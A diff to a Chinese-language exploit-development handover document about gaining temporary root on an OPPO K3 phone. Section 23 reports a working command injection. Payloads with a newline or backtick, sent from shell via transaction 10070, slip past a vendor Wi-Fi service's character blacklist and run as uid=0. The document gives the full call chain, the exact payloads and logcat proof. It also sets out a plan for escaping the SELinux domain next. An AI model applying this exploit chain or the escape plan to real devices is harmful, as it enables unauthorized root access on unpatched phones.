@@ -2,11 +2,11 @@
 
 | 项 | 值 |
 |---|---|
-| 版本 | **v2.12**，2026-11-18；v2 重写替代 v1 的 13 轮增补式长文。§14 = Binder 五轮审计，§5.2 + §15 = GhostLock 复核与静态收束，§16 = Wi-Fi 私有事务面（含 §16.11 **误判撤回**），§17 = 接手清单。**v2.8=§18 P0 静态定性；v2.9=§19 P2 六服务；v2.10=§20 外部复评重开 myftm；v2.11=§21 执行复评的新 P0/新 P1：Java/HIDL 传输无过滤确认 + myftm 本体逆向；v2.12=§22 同族九类命令全映射 + **regex 黑名单缺口（缺 `\n`/反引号/`<`/`>`）** + 更正 iwpriv 分支无整数转换 + 三接口不可达否证**。下次会话**从 §17 开始**，再按需查 §22 / §20 / §18 / §16 / §15 / §14 |
-| 状态 | **整体 no-go（未翻转）。** 四个内核面判定不可达；GhostLock 载体已闭合、缺内核地址泄露。Wi-Fi 私有事务面：从 shell 可调、入参被 uid 0 服务接收，历史注入串（均 `myft ` 空格前缀）被 `INVAILD_PARAMETER` 拒绝，未回显 uid=0（§16.11）。**§20 复评更正：`-3` 归因仅适用于 iwpriv 分支；myftm 分支（前缀 5 字节）实为 `/vendor/bin/myftm <原始尾串>` 裸拼进 `sh -c`，无引号/转义/过滤，shell 元字符可被解析 ⇒ 静态注入面开放、Wi-Fi P0 重开、待用户授权上机验证 L3。§22 进一步更正：iwpriv 分支同样是 `裸拼整条入参`，且黑名单只覆盖 11 个字符、缺 `\n`/反引号/`<`/`>` ⇒ 注入面不依赖 myftm 前缀。v2.9"非任意命令执行"断言已撤销** |
+| 版本 | **v2.13**，2026-11-18；v2 重写替代 v1 的 13 轮增补式长文。§14 = Binder 五轮审计，§5.2 + §15 = GhostLock 复核与静态收束，§16 = Wi-Fi 私有事务面（含 §16.11 **误判撤回**），§17 = 接手清单。**v2.8=§18 P0 静态定性；v2.9=§19 P2 六服务；v2.10=§20 外部复评重开 myftm；v2.11=§21 执行复评的新 P0/新 P1；v2.12=§22 同族九类命令全映射 + regex 黑名单缺口 + 更正 iwpriv 无整数转换；v2.13=§23 上机执行 —— L3 达成：受限域内 uid=0 命令执行已证**。下次会话**从 §17 开始**，再按需查 §23 / §22 / §20 / §18 / §16 / §15 / §14 |
+| 状态 | **Wi-Fi 面 L3 已达成（2026-11-18 12:07）：从 shell 可让 root 服务以 `uid=0` 执行任意命令**，域 `u:r:oplus_wifi_service:s0`，两次复现（§23）。**但这是被 SELinux 限制的 root**：读不到 `/data/system`、`selinuxfs`、`proc_security`、`shell_data_file`（§23.3）⇒ **"临时 ROOT（运行时 uid=0 命令执行）"已达成；"可自由读写的 root / 可用 root shell"未达成，缺的是域逃逸**。四个内核面仍不可达（未再触碰）；GhostLock 仍缺内核地址泄露但与当前主线无关。历史链路：`-3` 归因仅限 iwpriv 分支（§20）、myftm 分支裸拼（§20）、黑名单只覆盖 11 字符（§22）——**这三步都必须保留，它们是 §23 的前提** |
 | 原件 | `docs_archive/HANDOVER_v1_2026-11-17_full.md`（v1 全文 3368 行，含全部过程推理，**仅备查**） |
 | 唯一入口 | 本文件。数值以本文件为准；v1 与 `docs_archive/` 的其余文档一律视为历史证据，不得引用其数值 |
-| 设备终态 | `PCGM00_11_F.16` 未变；**未刷写、未解锁、未改分区、未 root**；`/data/local/tmp` 为空（§16 的实验探针已清理）；shell `id` 仍为 uid 2000；崩溃的 HAL 已自动重启。累计 5 次内核重启（均在前期竞态实验期） |
+| 设备终态 | `PCGM00_11_F.16` 未变；**未刷写、未解锁、未改分区、未装任何持久化文件**；`/data/local/tmp` 已清空（§23 的探针与载荷已删）；shell `id` 仍为 uid 2000；HAL 进程存活、无 tombstone。累计 5 次内核重启（均在前期竞态实验期，本轮 0 次） |
 | Binder 面审计 | `artifacts_adb/binder_audit/AUDIT_REPORT.md`（五轮：atlas 线索 5/5 闭合、确定否证）；**厂商二进制与系统镜像不入库** |
 | GhostLock 复核 | `artifacts_adb/binder_audit/GHOSTLOCK_RESCAN.md`（扫描器判重 bug 证实；3 条 xattr 栈覆盖候选）→ **`GHOSTLOCK_NUL_ANALYSIS.md`（剩余两项的静态收束：栈复用为几何确定性；NUL 不阻断；缺口 = 内核地址知识）** |
 
@@ -24,7 +24,7 @@
 | 只想避坑 | §6 负知识清单 + §10 方法论 |
 | GhostLock 现状（唯一活面）| **§15**（剩余两项的静态收束）→ §5.2.4 更正块 → §7 第 2 条 |
 | Binder 服务面 | §14（五轮审计：28/35 覆盖、atlas 线索 5/5 闭合否证）+ §19（P2 补审 6/7：hephaestus system 面被 uid==1000 门禁挡住；**antirootdialog 未完成，复评升为新 P1**）|
-| Wi-Fi 私有事务面（当前主线索）| **§22 → §20 → §18 → §16.11**（v2.12：九类 HIDL 命令全映射；黑名单缺 `\n`/反引号/`<`/`>` ⇒ iwpriv 分支亦可穿越；`sendSupplicantCommand`/`runWiFiScript` 无 Java 调用方 ⇒ 不可达；L3 仍待授权）|
+| Wi-Fi 私有事务面（当前主线索，**已取得受限 root**）| **§23 → §22 → §20 → §16.11**（v2.13：L3 达成——`\n`/反引号绕过黑名单，`sh -c` 以 uid=0 执行；域 `oplus_wifi_service` 受限，下一步是域逃逸）|
 
 **三条硬规则**
 
@@ -40,7 +40,10 @@
 
 **目标**：在不解 BL 的前提下取得 OPPO K3 的**临时 ROOT**（运行时 uid=0，重启即失）。官方"深度测试"/持久 root 出口（A 线）已按用户决定移除。
 
-**判定**：在设备现状下，**四个候选面（KGSL / binder×2 / FastRPC）判定不可达**；**GhostLock 面机制与载体均已成立，但阻断在"无内核地址泄露"**。每一面都定位到"卡在哪一环、缺什么能力"——不是"跑崩了"。
+**判定**：**临时 ROOT 的"uid=0 命令执行"一侧已达成（2026-11-18 12:07，Wi-Fi 私有事务面，§23）**；
+但该 root 处于 SELinux 域 `oplus_wifi_service` 内，**不具备无限制读写能力**，因此"可用 root"尚未达成，
+剩余缺口是**域逃逸**。四个内核候选面（KGSL / binder×2 / FastRPC）仍判定不可达；GhostLock 仍阻断在
+"无内核地址泄露"，但已不再是主线（不再需要内核原语）。
 
 ### 1.2 逐面结论
 
@@ -51,7 +54,7 @@
 | **binder** CVE-2023-20938 | **不成立**（漏洞未引入） | `off_end_offset` 形态处于 `44d8047f1d87 … 32e9f56a96d8` 之间，`is_failure=1 且 failed_at=0` 时循环 0 次 | §5.3 |
 | **binder** CVE-2022-20421 | 成立（pre-fix 形态确证） | 本机为 **ticket spinlock**，公开技术依赖 qspinlock；本机原语退化为"对两半相等的 4 字节字加 `0x00010001`"，并带 `wfe` 死等风险 | §5.3 |
 | **FastRPC** CVE-2023-33063 | 面存在 | 对 shell **双重封闭**：`O_RDWR` 被 SELinux `EACCES`；只读 fd 上 7 个已实现 ioctl 全 `EPERM` | §5.4 |
-| **OPPO Wi-Fi 私有事务**（非内核面）| tx10069/10070 从 shell 可达，字符串被 uid 0 服务接收 | **regex 黑名单只覆盖 11 字符（缺 `\n`/反引号/`<`/`>`），且 myftm 分支完全无过滤 ⇒ shell 可达分支存在可绕过的注入面；L3（`uid=0` 回显）未证**（§22 / §20 / §16.11） | §22 / §20 / §16.11 |
+| **OPPO Wi-Fi 私有事务**（非内核面）| **成立并已利用**：tx10069/10070 从 shell 可达，字符串被 uid 0 服务接收 | **L3 已达（§23）**：入参含 `\n` 或反引号即绕过 11 字符黑名单（§22），`sh -c` 在 `u:r:oplus_wifi_service:s0` 域内以 **uid=0** 执行任意命令，两次复现。**卡点移到域逃逸**：该域读不到 `/data/system`、`selinuxfs`、`proc_security`、`shell_data_file` | §23 / §22 / §20 |
 
 ### 1.3 主要资产与代价
 
@@ -440,7 +443,7 @@ ENOTTY（未实现）3833
 
 ---
 
-## 6. 负知识清单：23 条已作废的结论（**必须遵守，否则会重走死路**）
+## 6. 负知识清单：25 条已作废的结论（**必须遵守，否则会重走死路**）
 
 保留"已作废 + 依据"比删掉更有价值。以下每条都曾是"确定"结论。
 
@@ -469,6 +472,9 @@ ENOTTY（未实现）3833
 | "`executeDriverCommand` 前缀判据是 4 字节 `myft`，历史注入串进了 myftm 分支"（§7.7 / §16.11，2026-11-18 P0 前） | **更正** | native `0x9a38/0x9a4c` 还比较第 5 字节 `'m'`，真实前缀是 5 字节 `myftm`；历史 4 个注入串全是 `myft `（空格），走的是 iwpriv 分支。见 §18.3 |
 | "`-3 INVAILD_PARAMETER` 的码表在 Java 层 `onValues`" | **更正** | `uD6hk53bOimZNTzE924fVOYf3t8.onValues` 是 3 指令 lambda 壳，无码表；`-3` 在 native `0x9ddc` 写入，根因是 regex 黑名单。见 §18.2 |
 | "myftm 分支参数无法跳出固定 token、不是任意命令执行，不建议上机"（§18.4/§18.5，v2.8–v2.9） | **撤销（外部复评指出）** | 混淆了 shell 参数分隔与**控制操作符**：`;` `|` `&&` `$()` 不依赖空格即被 `sh -c` 解析。逐指令重建确认 cmd=`/vendor/bin/myftm `+input[5:]，无引号/转义/过滤 ⇒ 注入面静态开放，Wi-Fi P0 重开。见 §20 |
+| "iwpriv 分支参数经 `to_string(int)` 收敛，因此受限"（§18.4 / `WIFI_P0_PARAMETER_TRACE.md` §5，v2.8） | **更正（§22.3）** | 该分支把**整条原始入参**裸拼到 `/odm/bin/iwpriv ` 之后，无 `atoi/strtol/to_string`；`setMonChan`+`to_string(u32)` 属 `catchSnifferLog`（slot3）。"整数化"前提不存在 |
+| "Wi-Fi 注入均被 `INVAILD_PARAMETER` 拒绝 ⇒ 该面不可利用"（§16.11 修正后的表述，v2.7–v2.12） | **推翻（§23，上机）** | 历史串只用了 `;` `|`（确在黑名单内）。改用 `
+`/反引号后校验通过，`sh -c` 以 `uid=0` 执行，两次复现。**注意：09:35 那次"翻转"仍是误判，与本次无关** |
 
 ---
 
@@ -593,7 +599,7 @@ python tools/f16_rtmux_49_layout.py  # 4.9 结构体布局（离线可复跑）
 3. **闸门必须量化且可被否证**。`[0x288, 0x2BE]`、`off_end` 三元式、spinlock 指令序列、`EPERM` 实测 —— 都能被数据推翻，而不是靠"感觉不对"。
 4. **任何"窗口"都要用至少三组不同量级的数据交叉验证**。本项目两次把"看起来相关的时间间隔"当窗口（W2、W1），均被新对照组推翻；最终结论是"窗口根本不是变量"。
 5. **不可利用性判定写成五段式**：可达 → 悬垂 → 可控改写 → 复填 → 任意写，逐段给证据与缺口。"试到崩"只能证明某条路径不通，五段式才能说清**为什么**不通、**缺哪一块**。
-6. **旧结论必须现场作废**。本项目已作废 23 条曾"确定"的结论（§6）。文档保留"已作废 + 依据"比删掉更有价值 —— 否则下一轮会重走同一条死路。
+6. **旧结论必须现场作废**。本项目已作废 25 条曾"确定"的结论（§6）。文档保留"已作废 + 依据"比删掉更有价值 —— 否则下一轮会重走同一条死路。
 7. **不要用构建日期推断代码版本**。本机 2025-03 构建，binder 仍是 2018 年语义。
 8. **会触发内核缺陷的程序必须每步落盘**（`write(2)` + `fsync`），且成功路径也要输出 —— 否则崩溃点不可判定。
 
@@ -999,26 +1005,35 @@ FtmProbe 10069 android.net.wifi.IOplusWifiManager
 
 ### 17.1 一句话状态
 
-**整体 no-go。** 四个内核面维持原判定；Wi-Fi 私有事务面经四轮反复后收敛为：
-**shell 可调用 → 字符串被 root 服务接收 → 命令串裸拼进 `sh -c` → 唯一的过滤器只覆盖 11 个字符（缺 `\n`/反引号/`<`/`>`）⇒ 静态注入面开放 → 但从未回显 `uid=0`。**
-两次"结论翻转/实锤"均为误判，已在 §16.11 撤回；"myftm 非任意命令执行"与"iwpriv 参数被整数化"两处断言已分别在 §20/§22 撤销。**设备终态干净，可随时开新对话继续。**
+**已取得受限 root 命令执行（2026-11-18 12:07，§23）。** 从 shell 发 tx 10070、载荷含 `\n` 或反引号即绕过
+11 字符黑名单，`sh -c` 以 `uid=0`、域 `u:r:oplus_wifi_service:s0` 执行任意命令，两次复现。
+**但该域受限**（读不到 `/data/system`、`selinuxfs`、`proc_security`、`shell_data_file`）⇒ **"可用 root"未达成，
+剩余缺口是 SELinux 域逃逸**。四个内核面仍不可达、GhostLock 仍缺地址泄露，两者均已非主线。
+历史链路必须完整保留：`-3` 只属 iwpriv 分支（§20）、myftm 裸拼（§20）、黑名单只 11 字符（§22）。
 
 ### 17.2 三个结论层次（后续判断必须严守）
 
 | 层次 | 当前证据 | 状态 |
 |---|---|---|
 | L1 字符串被 root 服务接收 | logcat `entering executeDriverCommand(<s>)` 逐字回显；服务 rc 为 `user root` | **已证** |
-| L2 命令被执行 | 服务端 `completed successfully` + 可观察副作用 | **未证**（`myft -h` 的"成功"仅证明参数格式合法） |
-| L3 提权成立 | 现场回显 `uid=0(root)`，调用方仍为 shell uid 2000 | **未证，且多次尝试失败** |
+| L2 命令被执行 | `sh` 进程以 `u:r:oplus_wifi_service:s0` 出现在 audit 日志；`completed successfully` | **已证（§23，2026-11-18 12:07）** |
+| L3 提权成立 | 现场回显 `uid=0(root)`（`gid=1010(wifi)`，域 `oplus_wifi_service`），调用方仍为 shell uid 2000 | **已证（受限域）**；"可用 root"仍需域逃逸 |
 
-**规则：L1 成立不得推出 L2/L3。** 本次误判就是把 L1 当 L3。
+**规则：L1 成立不得推出 L2/L3。** 2026-11-18 09:35 的误判就是把 L1 当 L3；
+本次 L3 是**另一次执行**取得的（`\n` + 反引号载荷），与那次误判的载荷无因果关系。
 
 ### 17.3 下一步优先级（按推荐顺序）
 
-> **🔴 v2.12 更新（2026-11-18，见 §22）：** 新 P0 的静态部分已收束到"过滤器本身有缺口"——
+> **🟢 v2.13 更新（2026-11-18 12:07，见 §23）：L3 已达成。** Wi-Fi 面不再是"待验证"，而是"已取得受限 root"。
+> 新的优先级只有一条主线：
+> - **P0 = SELinux 域逃逸**（纯静态优先）：枚举 `oplus_wifi_service` 的可写面与"被更高权限域消费"的落点，
+>   把 uid=0 的受限执行变成可用 root。**不要**再重复已验证的注入实验。
+> - **P1 = antirootdialog**（仍缺物料，需完整 factory 镜像或授权只读拉取）。
+> - **冻结**：KGSL / binder×2 / FastRPC / GhostLock——已非主线，不再需要内核原语。
+>
+> **🔴 v2.12 更新（2026-11-18，见 §22）：** 静态部分收束到"过滤器本身有缺口"——
 > 黑名单只含 11 字符，`\n`/反引号/`<`/`>` 可穿越，且 iwpriv 分支不做整数转换；同族另三接口经全镜像
-> 检索确认不可达（`runWiFiScript`/`sendSupplicantCommand` 无调用方，`catchSnifferLog` 仅 int 入参）。
-> **剩余动作只有一件：授权上机验证 L3**；antirootdialog 仍缺物料。
+> 检索确认不可达。**该静态结论已被 §23 的上机结果证实。**
 >
 > **🔴 v2.10 复评重排（2026-11-18，来源 `docs_archive/审核意见CHATGPT-v002.txt`，见 §20）：**
 > - **P0 = Wi-Fi myftm 分支重开**（静态注入面已证开放，最高优先，纯静态先补过滤路径，不上机）；
@@ -1061,11 +1076,12 @@ hans/horae/oiface/orms/appdata 无命令执行面或带签名校验；**antiroot
 ### 17.4 明确禁止重复的动作
 
 1. **不要再猜令牌 / 用 `service call` 试**——16 次探测已证是调用方 ABI 问题，真客户端已解决；
-2. **不要再试已被拒的元字符**——`;` `|` `$` `&` `@` `#` `%` `*` `^` `:` `?` 全部在 native 黑名单内（§22.2），
-   重复只会再触发 `-3` 与 HAL 崩溃；**但 `\n`、反引号、`<`、`>` 从未被测试且不在黑名单内**——
-   若获授权，应测的正是这一类（§22.6 的最小验证设计），不要被本条的旧措辞误导；
-3. **不要用"参数回显"当执行证据**——这是本次误判的直接根因；
-4. **不要在 L3 未达时写"实锤""翻转"**——实锤三条件见 §16.11 / §17.2。
+2. **不要再重复注入实验**——`\n`/反引号载荷已验证成功（§23），重复执行只会刷日志、增加暴露面；
+   需要新的执行时，直接复用 `tools/javaprobe` + `@file` 载荷，且一次只测一个变量；
+3. **不要用"参数回显"当执行证据**——判据是 `uid=0` 回显 + `sh` 进程的域标签（§23.3）；
+4. **不要把"uid=0 命令执行"写成"已 root / 可用 root"**——本机是 SELinux 受限域（§23.4），
+   在域逃逸取得前，正确表述是"受限域内的 root 命令执行"；
+5. **不要在未登记判据的情况下上机**——§7.1 / §16.11 的流程必须遵守。
 
 ### 17.5 工具与物料清单（新对话可直接用）
 
@@ -1074,7 +1090,8 @@ hans/horae/oiface/orms/appdata 无命令执行面或带签名校验；**antiroot
 | 主文档 | `HANDOVER.md`（本文件，唯一权威） |
 | Wi-Fi 全证据 | `artifacts_adb/binder_audit/F16_WIFI_FTM_TRACE.md`（§7 静态链 / §9 外层分派 / §11 可达 / §12 撤回）|
 | Wi-Fi P0 归因 | `artifacts_adb/binder_audit/WIFI_P0_PARAMETER_TRACE.md`（`-3` 逐层归因 / myftm 前缀更正 / 合法命令格式表）|
-| **Wi-Fi P1 九类命令 + 过滤边界** | **`artifacts_adb/binder_audit/WIFI_P1_ROOT_COMMAND_AUDIT.md`**（vtable 槽位全映射 / 黑名单缺口 / 三接口不可达否证 / `getIniVersion` 任意读）；工具 `tools/wifi_slot_audit.py` |
+| **Wi-Fi P1 九类命令 + 过滤边界** | **`artifacts_adb/binder_audit/WIFI_P1_ROOT_COMMAND_AUDIT.md`**（vtable 槽位全映射 / 黑名单缺口 / §7.2 上机结果 / 域能力边界）；工具 `tools/wifi_slot_audit.py` |
+| **L3 现场取证** | **`artifacts_adb/binder_audit/P1_L3_EVIDENCE.txt`**（调用方 `id` / 载荷字节 / 事务回包 / `uid=0` 回显与 avc 拒绝原文） |
 | P2 七服务审计 | `artifacts_adb/binder_audit/P2_SEVEN_SERVICES_AUDIT.md`（宿主/身份/门禁总表 / hephaestus uid 门禁解码 / antirootdialog 缺口）|
 | GhostLock 静态 | `artifacts_adb/binder_audit/GHOSTLOCK_NUL_ANALYSIS.md` |
 | GhostLock 载体 | `artifacts_adb/binder_audit/GHOSTLOCK_RESCAN.md` |
@@ -1350,6 +1367,7 @@ v2.9 断言"myftm 分支参数只是固定路径后的一个 token，无法逃�
 ### 22.6 状态与下一步
 
 - **整体 no-go / Conditional GO 不变**；L1 已证、L2 加强、**L3 未证**（本轮纯离线）。
+  > ⚠️ **本节状态已被 §23 取代**：2026-11-18 12:07 上机执行，L3 已达成（受限域 `uid=0`）。
 - **不上机**：L3 唯一判据仍是授权下的 `uid=0` 现场回显（§16.11）。
 - 建议的最小验证设计（授权后）：tx 10070 发 `x\nid` → 观察 `uid=0`；失败则改测反引号；
   只写 `/data/local/tmp`，单次调用，不留驻留物。
@@ -1357,3 +1375,106 @@ v2.9 断言"myftm 分支参数只是固定路径后的一个 token，无法逃�
   W2 的 argv 未逐字节展开；`framework.dex`/`oplus-framework.dex` 因 androguard hiddenapi 解析失败被跳过
   （已用二进制串检索兜底）；换行/反引号的 shell 行为属静态推演。
 - 复评剩余的 antirootdialog（新 P1）仍因物料不足暂停，需完整 factory 镜像或设备只读拉取（授权）。
+
+---
+
+## 23. 上机执行：L3 达成 —— 受限域内的 uid=0 命令执行（2026-11-18 12:06–12:07）
+
+> 触发：用户接入设备并指示继续。**判据先登记后执行**（`WIFI_P1_ROOT_COMMAND_AUDIT.md` §7.1），
+> 原始日志 `artifacts_adb/binder_audit/P1_L3_EVIDENCE.txt`。
+
+### 23.1 一句话结果
+
+**从 shell（uid 2000）发 tx 10070，载荷含一个换行（或反引号）即可绕过 native 的 11 字符黑名单；
+拼出的 `/vendor/bin/iwpriv <载荷>` 由 `/vendor/bin/sh -c` 以 `uid=0(root)`、域 `u:r:oplus_wifi_service:s0` 执行。
+logcat 回显 `uid=0(root)`，两次独立复现。** 这不是旧误判的翻版——旧误判用的是 `;`/`|`（确在黑名单内、确实被拒），
+本次用的是**从未被尝试过**的 `\n` 与反引号。
+
+### 23.2 执行链与载荷
+
+```
+shell(uid 2000) → javaprobe(app_process) → transact(10070, "android.net.wifi.IOplusWifiManager", String)
+  → WifiServiceImpl.onTransact(18 条指令) → OplusWifiTransactionHelper.sendFTMCommand
+  → enforceAccessPermission() == return-void（空实现）
+  → OplusWifiHalService.executeDriverCommand(String)          ← 无长度/字符校验
+  → HIDL IOppoWifiService.executeDriverCommand (code 4)
+  → /odm/bin/iwpriv + " " + <整条入参>   （0x9b38→0x9d58，无转换）
+  → sub_9f64 regex[@#$%&*^:;?|]+        （不拦 \n、反引号、<、>）
+  → execv("/vendor/bin/sh", {sh,"-c",cmd})   （0x95b4）
+  → sh 以 uid=0 / gid=1010(wifi) / u:r:oplus_wifi_service:s0 执行
+```
+
+成功的两条载荷（真实 0x0A 换行，经 `od -An -c` 核对）：
+
+| # | 载荷 | 结果 |
+|---|---|---|
+| 1 | `x\nid > /data/local/tmp/_p1_uid` | 命令执行；`sh` 出现且被 MAC 拒绝 search `shell_data_file`；文件未建成 |
+| 2 | ``x\nlog -t P1UID `id` `` | **`I P1UID : uid=0(root) …`** —— 通过 `log` 把 `id` 输出写进 logcat |
+| 3 | `x\nlog -t P1CAP `getenforce`` + `ls -ld /data/system` + `cat /proc/sys/kernel/randomize_va_space` | 三条均 `avc: denied`（域能力探测） |
+
+### 23.3 证据（原文）
+
+```
+# 调用方
+uid=2000(shell) gid=2000(shell) … context=u:r:shell:s0
+
+# 事务
+TRANSACT=true   REPLY size=8 hex=0000000001000000   INT=1
+
+# HAL
+D OplusWifiHalService: log -t P1UID `id`) completed successfully.
+D OplusWifiHalService: log -t P1UID `id`) with result =
+
+# 执行者（决定性）
+I P1UID : uid=0(root) gid=1010(wifi) groups=1010(wifi),1000(system),2901(vendor_qti_diag),3005(net_admin) context=u:r:oplus_wifi_service:s0
+
+# 域限制
+W sh : avc: denied { search } … tcontext=u:object_r:shell_data_file:s0 scontext=u:r:oplus_wifi_service:s0
+W getenforce : avc: denied { read } … tcontext=u:object_r:selinuxfs:s0 … permissive=0
+W ls : avc: denied { getattr } for path="/data/system" … tcontext=u:object_r:system_data_file:s0
+W cat : avc: denied { read } … tcontext=u:object_r:proc_security:s0
+```
+
+### 23.4 这个 root 能做什么、不能做什么（边界，必须一起读）
+
+**已证能做**：以 uid=0 运行任意命令；读 `wifi`/`system`/`vendor_qti_diag`/`net_admin` 组可读的文件；
+以 root 身份调用 `/odm/bin/iwpriv`、`/vendor/bin/wpa_cli` 等厂商工具；访问本域允许的 `/data/vendor/wifi` 等路径。
+
+**已证不能做**（三条实测拒绝）：读 `selinuxfs`（`getenforce`）、stat `/data/system`、读 `proc_security`；
+以及 search `shell_data_file`（`/data/local/tmp`）。
+
+**因此**：不能直接装 `su`、改 `/system` 或 `/vendor`、读任意 `/data`；**没有交互式 root shell**
+（每次调用是一次性 `sh -c`，无 tty、无持久进程）。**"可用 root"未达成。**
+
+### 23.5 §16.11 三条件核销
+
+| 条件 | 结果 |
+|---|---|
+| ① 服务端报 `completed successfully` | ✅ `… completed successfully.` |
+| ② 命令串有可观察的只读副作用 | ✅ `id` 的输出出现在 logcat（`I P1UID`），且 `sh` 进程在 audit 日志中留下域标签 |
+| ③ 现场回显 `uid=0(root)` 且调用方仍为 shell | ✅ 同一次会话内：调用方 `uid=2000(shell)`，回显 `uid=0(root)` |
+
+⇒ 按项目自定标准，**"临时 ROOT（运行时 uid=0 命令执行）"成立**；**"可用 root"不成立**。
+
+### 23.6 状态变更
+
+| 项 | v2.12 | v2.13 |
+|---|---|---|
+| Wi-Fi 面 | L2 静态开放、L3 未证 | **L3 已证（受限域）** |
+| 项目结论 | no-go | **"受限 root 命令执行"已取得；"可用 root"仍 no-go** |
+| 主缺口 | 过滤器可绕过（静态） | **SELinux 域逃逸**（`oplus_wifi_service` → 更高权限域） |
+| 内核面 | 四条不可达 | 不变（且已非主线：不再需要内核原语） |
+
+### 23.7 下一步（域逃逸，纯静态优先）
+
+1. **枚举本域可写面**：从 `vendor` sepolicy（`sepolicy` 二进制或 `/sys/fs/selinux/policy` 不可读时的镜像侧提取）
+   导出 `allow oplus_wifi_service * :file write`，列出所有可写路径与目标类型；
+2. **找"被更高权限域消费"的落点**：本域可写的配置/脚本被 `init`、`system_server`、`hal_*` 读取者优先
+   （典型：`/data/vendor/wifi/*` 配置、`/mnt/vendor/persist/*`、`/data/misc/wifi/*`）；
+3. **组权限面**：`1000(system)`、`2901(vendor_qti_diag)`、`3005(net_admin)` 三个附加组的可访问资源；
+4. **不宣称**：在拿到新的 `uid=0` + 更高域写入/执行证据前，不得写"已 root"或"可用 root"。
+
+### 23.8 现场清理（已执行）
+
+`/data/local/tmp` 下 `ftmprobe.jar` 与三个载荷文件已删除，目录为空；HAL 进程存活、无 tombstone；
+shell 仍为 uid 2000；未写属性、未安装任何东西、未重启。
